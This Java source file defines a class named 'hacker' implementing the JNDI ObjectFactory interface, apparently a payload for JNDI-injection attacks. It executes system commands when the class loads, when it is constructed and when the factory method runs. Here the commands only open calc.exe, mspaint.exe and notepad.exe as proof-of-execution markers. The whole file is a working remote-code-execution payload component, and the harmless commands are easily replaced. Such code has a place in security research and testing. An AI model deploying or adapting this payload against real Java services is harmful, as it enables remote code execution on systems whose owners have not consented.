import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

import java.io.IOException;
import java.util.Hashtable;

public class hacker implements ObjectFactory  {
    public hacker() throws Exception{
        Runtime.getRuntime().exec("mspaint.exe");
    }

    static{
        try{
            Runtime.getRuntime().exec("calc.exe");
        }catch(Exception e){
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("notepad.exe");
        return null;
    }
}